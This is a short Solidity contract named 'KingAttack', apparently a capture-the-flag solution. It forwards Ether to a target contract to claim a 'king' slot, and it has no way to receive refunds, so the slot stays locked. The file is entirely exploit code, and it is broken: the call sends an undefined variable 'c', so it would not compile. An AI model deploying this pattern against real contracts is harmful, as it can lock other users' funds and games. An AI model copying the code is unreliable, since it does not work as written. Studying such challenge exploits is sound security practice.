// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    address private target;

    constructor (address _target) {
        target = _target;    
    }

    function attack() public payable {
       // msg.value - 1000000000000001
       (bool sent, ) = payable(target).call{value: c}("");
       require(sent, "Failed to send Ether");
    }
}
